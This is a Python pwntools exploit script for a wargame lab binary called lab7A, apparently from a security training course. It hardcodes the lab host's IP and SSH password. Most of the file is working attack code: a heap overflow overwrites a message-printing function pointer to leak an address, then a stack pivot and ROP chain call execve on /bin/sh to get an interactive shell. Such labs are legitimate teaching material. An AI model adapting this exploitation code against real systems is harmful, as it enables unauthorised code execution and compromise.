#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.209.13 --user lab7A --pass us3_4ft3r_fr33s_4re_s1ck --path /levels/lab07/lab7A
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab7A')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.209.13'
port = int(args.PORT or 22)
user = args.USER or 'lab7A'
password = args.PASSWORD or 'us3_4ft3r_fr33s_4re_s1ck'
remote_path = '/levels/lab07/lab7A'

# Connect to the remote SSH server
#shell = None
#if not args.LOCAL:
#    shell = ssh(user, host, port, password)
#    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        #return shell.process([remote_path] + argv, *a, **kw)
        return connect(host, port)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

STACK_PIVOT     = '\xcb\x0c\x05\x08'
ADD_EAX_2       = '\x17\x8e\x09\x08'
XCHG_EAX_ESP    = '\x6c\xbb\x04\x08'

POP_EDX_EBX_ECX = '\x30\x03\x07\x08'
POP_EAX         = p32(0x080bd226)
POP_EBX         = p32(0x080481c9)
SYSCALL         = p32(0x08048ef6)
PRINT_MESSAGE   = p32(0x8049086)

LEAKLOAD = 'C' * 140 + PRINT_MESSAGE + '/bin/sh\x00'

io = start()


log.info("Setting up smasher message for string address leak...") 
io.sendlineafter("Enter Choice:", "1")
io.sendlineafter("Enter data length:", "129")
io.sendlineafter("Enter data to encrypt:", 'A' * 128 + p8(len(LEAKLOAD)))

log.info("Setting up leak victim message...")
io.sendlineafter("Enter Choice:", "1")
io.sendlineafter("Enter data length:", "128")
io.sendlineafter("Enter data to encrypt:", 'B' * 128)

log.info("Overwriting print_message with address leak...")
io.sendlineafter("Enter Choice:", "2")
io.sendlineafter("Input message index to edit:", "0")
io.sendlineafter("Input new message to encrypt:", LEAKLOAD)

p = log.progress("Leaking shell address: ")
io.sendlineafter("Enter Choice:", "4")
io.sendlineafter("Input message index to print:", "1")

shell_addr = io.recvuntil('\n').strip()
shell_addr = u32(shell_addr.zfill(8).decode('hex'), endian="big" )
p.success(hex(shell_addr))

PAYLOAD = 'C' * 140 + STACK_PIVOT + POP_EDX_EBX_ECX + p32(0) * 3 + POP_EAX + p32(0x0b) + POP_EBX + p32(shell_addr + 4) + SYSCALL

log.info("Setting up smasher message for ROP...")
io.sendlineafter("Enter Choice:", "1")
io.sendlineafter("Enter data length:", "129")
io.sendlineafter("Enter data to encrypt:", 'A' * 128 + p8(len(PAYLOAD)))

log.info("Setting up syscall victim message...")
io.sendlineafter("Enter Choice:", "1")
io.sendlineafter("Enter data length:", "128")
io.sendlineafter("Enter data to encrypt:", 'B' * 128)

log.info("Overwriting print_message with stack pivot and ROP chain...")
io.sendlineafter("Enter Choice:", "2")
io.sendlineafter("Input message index to edit:", "2")
io.sendlineafter("Input new message to encrypt:", PAYLOAD)

io.sendlineafter("Enter Choice:", "4")
io.sendlineafter("Input message index to print:", "3" + cyclic(11) + ADD_EAX_2 + ADD_EAX_2 + XCHG_EAX_ESP)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

